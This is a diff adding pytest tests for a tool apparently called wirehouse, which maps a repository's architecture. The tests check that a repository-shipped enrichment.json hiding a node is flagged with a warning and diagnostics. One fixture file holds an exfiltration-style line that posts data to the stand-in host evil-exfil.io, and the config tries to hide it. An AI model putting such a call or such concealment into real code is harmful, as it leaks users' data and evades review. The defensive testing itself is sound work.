@@ -1131,3 +1131,38 @@ def test_share_keeps_api_routes(tmp_path):
     assert {"/users/{id}", "/home/dashboard"} <= eps
     quests = json.dumps(data["quests"])
     assert "GET /home/dashboard" in quests and "~" not in quests   # the route in narrated text survives too
+
+
+def test_enrichment_shipped_with_the_repo_is_flagged(tmp_path, capsys):
+    # A cloned repository can carry its own enrichment.json that hides a block. It is still applied,
+    # but the run warns loudly and every removal is listed in the Checks panel.
+    import shutil
+    import subprocess
+
+    if not shutil.which("git"):
+        pytest.skip("git not installed")
+    from wirehouse.cli import main
+
+    _write(tmp_path, {
+        "app/requirements.txt": "httpx\n",
+        "app/sync.py": 'import httpx\nhttpx.post("https://evil-exfil.io/upload", json={})\n',
+        "wirehouse-out/enrichment.json": json.dumps({"remove_nodes": ["ext:evil-exfil.io"]}),
+    })
+    run = lambda *a: subprocess.run(["git", "-C", str(tmp_path), *a], check=True, capture_output=True)  # noqa: E731
+    run("init", "-q")
+    run("add", "-A", "-f")
+    assert main(["build", str(tmp_path)]) == 0
+    printed = capsys.readouterr().out
+    assert "WARNING" in printed and "checked into the repository" in printed
+    data = json.loads((tmp_path / "wirehouse-out" / "archmap.json").read_text(encoding="utf-8"))
+    assert "ext:evil-exfil.io" not in {n["id"] for n in data["nodes"]}          # still applied
+    codes = {(d["code"], d["subject"]) for d in data["diagnostics"]}
+    assert ("enrichment/removed-node", "remove_nodes ext:evil-exfil.io") in codes
+    assert ("enrichment/from-repository", "enrichment.json") in codes
+
+
+def test_removed_connections_are_listed_in_the_checks(archmap):
+    data = merge(json.loads(json.dumps(archmap)), {"remove_edges": [{"source": "unit:js:web", "target": "unit:python:api"}]})
+    hits = [d for d in data["diagnostics"] if d["code"] == "enrichment/removed-edge"]
+    assert len(hits) == 1 and hits[0]["subject"] == "remove_edges unit:js:web->unit:python:api"
+    assert hits[0]["severity"] == "warning"
